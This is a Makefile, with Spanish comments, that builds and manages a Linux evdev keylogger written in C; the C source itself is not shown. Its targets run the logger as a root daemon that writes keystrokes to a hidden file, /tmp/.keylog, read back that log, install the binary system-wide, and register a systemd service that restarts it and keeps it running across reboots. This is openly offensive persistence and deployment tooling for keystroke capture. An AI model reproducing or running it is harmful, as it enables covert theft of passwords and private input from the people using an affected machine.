# ============================================================
# Makefile para keylogger en C (Linux evdev)
# ============================================================

# Variables de compilación
CC       = gcc
CFLAGS   = -Wall -Wextra -O2 -pedantic
LDFLAGS  = -lrt
SOURCE   = keylogger.c
TARGET   = keylogger

# Rutas y archivos
LOG_FILE = /tmp/.keylog
PID_FILE = /tmp/keylogger.pid
INSTALL_DIR = /usr/local/bin
BIN_PATH  = $(INSTALL_DIR)/$(TARGET)

# Colores para salida (opcional)
RED    = \033[0;31m
GREEN  = \033[0;32m
YELLOW = \033[0;33m
NC     = \033[0m

# ============================================================
# Objetivo por defecto: all
# ============================================================
all: $(TARGET)

# Compilar el ejecutable
$(TARGET): $(SOURCE)
	@echo "$(GREEN)Compilando $(TARGET)...$(NC)"
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
	@echo "$(GREEN)Compilación exitosa: ./$(TARGET)$(NC)"

# ============================================================
# Ejecución (como demonio)
# ============================================================
run: $(TARGET)
	@if [ -f $(PID_FILE) ] && kill -0 $$(cat $(PID_FILE)) 2>/dev/null; then \
		echo "$(YELLOW)El keylogger ya está en ejecución (PID $$(cat $(PID_FILE))).$(NC)"; \
	else \
		echo "$(GREEN)Iniciando keylogger en modo demonio...$(NC)"; \
		sudo ./$(TARGET); \
		sleep 1; \
		PID=$$(pgrep -x $(TARGET) | head -1); \
		if [ -n "$$PID" ]; then \
			echo $$PID > $(PID_FILE); \
			echo "$(GREEN)Keylogger iniciado con PID $$PID. Log: $(LOG_FILE)$(NC)"; \
		else \
			echo "$(RED)Error: no se pudo obtener el PID.$(NC)"; \
			exit 1; \
		fi; \
	fi

# ============================================================
# Detener el keylogger
# ============================================================
stop:
	@if [ -f $(PID_FILE) ]; then \
		PID=$$(cat $(PID_FILE)); \
		if kill -0 $$PID 2>/dev/null; then \
			echo "$(YELLOW)Deteniendo keylogger (PID $$PID)...$(NC)"; \
			sudo kill $$PID; \
			rm -f $(PID_FILE); \
			echo "$(GREEN)Keylogger detenido.$(NC)"; \
		else \
			echo "$(RED)El proceso $$PID ya no existe. Eliminando PID file.$(NC)"; \
			rm -f $(PID_FILE); \
		fi; \
	else \
		PID=$$(pgrep -x $(TARGET) | head -1); \
		if [ -n "$$PID" ]; then \
			echo "$(YELLOW)Keylogger en ejecución (PID $$PID) pero sin PID file. Deteniendo...$(NC)"; \
			sudo kill $$PID; \
			echo "$(GREEN)Detenido.$(NC)"; \
		else \
			echo "$(RED)No se encontró el keylogger en ejecución.$(NC)"; \
		fi; \
	fi

# ============================================================
# Estado del keylogger
# ============================================================
status:
	@PID=$$(pgrep -x $(TARGET) | head -1); \
	if [ -n "$$PID" ]; then \
		echo "$(GREEN)Keylogger está ejecutándose con PID $$PID.$(NC)"; \
		if [ -f $(PID_FILE) ]; then \
			echo "PID file coincide: $$(cat $(PID_FILE))"; \
		else \
			echo "$(YELLOW)No hay PID file, pero el proceso existe.$(NC)"; \
		fi; \
	else \
		echo "$(RED)Keylogger no está en ejecución.$(NC)"; \
	fi

# ============================================================
# Leer el log (últimas líneas)
# ============================================================
read:
	@if [ -f $(LOG_FILE) ]; then \
		if [ -n "$(LINES)" ]; then \
			tail -n $(LINES) $(LOG_FILE); \
		else \
			tail -n 20 $(LOG_FILE); \
		fi; \
	else \
		echo "$(RED)El archivo de log $(LOG_FILE) no existe.$(NC)"; \
	fi

# ============================================================
# Instalar el binario en el sistema
# ============================================================
install: $(TARGET)
	@echo "$(GREEN)Instalando $(TARGET) en $(INSTALL_DIR)...$(NC)"
	sudo cp $(TARGET) $(BIN_PATH)
	sudo chmod 755 $(BIN_PATH)
	# (Opcional) Establecer setuid para evitar sudo al ejecutar (peligroso)
	# sudo chmod u+s $(BIN_PATH)
	@echo "$(GREEN)Instalación completada. Puedes usar '$(TARGET)' desde cualquier lugar.$(NC)"
	@echo "$(YELLOW)Nota: para ejecutar necesitas permisos de root o estar en el grupo 'input'.$(NC)"

# ============================================================
# Desinstalar
# ============================================================
uninstall:
	@if [ -f $(BIN_PATH) ]; then \
		echo "$(YELLOW)Eliminando $(BIN_PATH)...$(NC)"; \
		sudo rm -f $(BIN_PATH); \
		echo "$(GREEN)Desinstalado.$(NC)"; \
	else \
		echo "$(RED)El binario no está instalado en $(BIN_PATH).$(NC)"; \
	fi

# ============================================================
# Limpiar archivos compilados
# ============================================================
clean:
	@echo "$(YELLOW)Limpiando archivos objeto y ejecutable...$(NC)"
	rm -f $(TARGET) *.o
	@echo "$(GREEN)Limpieza completada.$(NC)"

# ============================================================
# Reiniciar (stop + run)
# ============================================================
restart: stop run

install-service:
	@echo "Creando servicio systemd..."
	@echo "[Unit]\nDescription=Keylogger\nAfter=network.target\n\n[Service]\nExecStart=$(BIN_PATH)\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target" | sudo tee /etc/systemd/system/keylogger.service > /dev/null
	sudo systemctl daemon-reload
	sudo systemctl enable keylogger
	sudo systemctl start keylogger

# ============================================================
# Objetivo "all" también se ejecuta por defecto
# ============================================================
.PHONY: all run stop status read install uninstall clean restart install-service
